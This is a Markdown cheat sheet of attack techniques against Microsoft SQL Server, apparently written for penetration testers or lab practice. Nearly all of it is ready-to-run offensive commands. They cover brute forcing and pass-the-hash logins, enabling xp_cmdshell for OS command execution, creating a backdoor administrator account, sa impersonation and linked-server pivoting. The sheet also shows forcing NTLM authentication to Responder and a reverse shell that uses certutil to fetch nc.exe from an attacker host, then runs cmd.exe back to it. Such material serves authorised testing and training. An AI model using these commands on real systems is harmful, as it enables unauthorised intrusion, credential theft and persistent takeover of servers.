# MSSQL Attacks

Microsoft SQL Server runs on port **1433** by default. Very common on Windows boxes. The key attack is getting `xp_cmdshell` working — it lets you run OS commands directly from SQL queries, giving you RCE.

---

## Discovery & Enumeration

```sh
# Nmap
nmap -p 1433 --script ms-sql-info,ms-sql-config,ms-sql-empty-password <ip>

# NetExec
nxc mssql <ip/cidr>
nxc mssql <ip> -u '' -p ''          # null session check
nxc mssql <ip> -u sa -p ''          # default sa with blank password
nxc mssql <ip> -u users.txt -p passwords.txt   # brute force
```

---

## Connecting to MSSQL

### From Linux (Impacket)

```sh
# With password
mssqlclient.py DOMAIN/user:pass@<ip>
mssqlclient.py DOMAIN/user:pass@<ip> -windows-auth    # use Windows auth

# With hash
mssqlclient.py DOMAIN/user@<ip> -hashes :<NTLM-hash> -windows-auth

# sa account (local SQL auth)
mssqlclient.py sa:''@<ip>
mssqlclient.py sa:password@<ip>
```

### From Windows

```sh
# sqlcmd (built-in on Windows)
sqlcmd -S <ip> -U sa -P password
sqlcmd -S <ip> -Q "SELECT @@version"

# PowerShell
Invoke-Sqlcmd -ServerInstance <ip> -Username sa -Password password -Query "SELECT @@version"
```

---

## Enumeration Inside MSSQL

```sql
-- SQL server version and hostname
SELECT @@version
SELECT @@SERVERNAME

-- List databases
SELECT name FROM master.dbo.sysdatabases

-- List tables in a database
USE <database>
SELECT name FROM sys.tables

-- Dump a table
SELECT * FROM <table>

-- Current user and privileges
SELECT SYSTEM_USER           -- SQL user
SELECT IS_SRVROLEMEMBER('sysadmin')    -- 1 = yes, 0 = no

-- List all users
SELECT name FROM master.sys.server_principals WHERE type_desc = 'SQL_LOGIN'

-- Check if xp_cmdshell is enabled
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell'
```

---

## xp_cmdshell — OS Command Execution

`xp_cmdshell` runs OS commands as the SQL Server service account (often SYSTEM or a privileged account).

### Enable xp_cmdshell (Needs sysadmin)

```sql
-- Enable advanced options first
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;

-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

### Run Commands

```sql
-- Basic command execution
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'whoami /priv'
EXEC xp_cmdshell 'ipconfig'

-- Check write permissions
EXEC xp_cmdshell 'dir C:\temp'

-- Create a user
EXEC xp_cmdshell 'net user hacker Pa33w0rd! /add'
EXEC xp_cmdshell 'net localgroup administrators hacker /add'
```

### Get a Reverse Shell

```sql
-- Download nc.exe from Kali and run reverse shell
EXEC xp_cmdshell 'certutil -urlcache -split -f http://<KALI-IP>:8080/nc.exe C:\temp\nc.exe'
EXEC xp_cmdshell 'C:\temp\nc.exe -e cmd.exe <KALI-IP> 4444'
```

```sh
# On Kali — listener first
nc -lvnp 4444
```

---

## Impersonation (If Not sysadmin)

Some users can impersonate other SQL users. If you can impersonate sa or a sysadmin:

```sql
-- Check who you can impersonate
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'

-- Impersonate sa
EXECUTE AS LOGIN = 'sa'

-- Verify
SELECT SYSTEM_USER    -- should now show 'sa'

-- Now enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami'
```

---

## Linked Servers

MSSQL servers can be linked — you query one server and it executes on another. If the link uses a privileged account on the remote server, you can pivot.

```sql
-- List linked servers
SELECT * FROM sys.servers

-- Execute query on linked server
SELECT * FROM OPENQUERY(<linked-server-name>, 'SELECT @@version')

-- Enable xp_cmdshell on linked server
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE') AT [<linked-server>]
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [<linked-server>]
EXEC ('xp_cmdshell ''whoami''') AT [<linked-server>]
```

---

## UNC Path Hash Capture

MSSQL can be tricked into authenticating to a UNC path — Responder captures the hash.

```sql
-- Trigger NTLM auth to Responder
EXEC xp_dirtree '\\<KALI-IP>\share'
EXEC xp_fileexist '\\<KALI-IP>\share\test'
```

```sh
# On Kali — Responder running
sudo responder -I eth0 -dPv
# Hash appears → crack with hashcat -m 5600
```

---

## NetExec MSSQL Module

```sh
# Check for xp_cmdshell already enabled
nxc mssql <ip> -u user -p pass --local-auth -q "SELECT @@version"

# Execute OS command directly
nxc mssql <ip> -u user -p pass -x "whoami"         # cmd
nxc mssql <ip> -u user -p pass -X "whoami"         # PowerShell
```
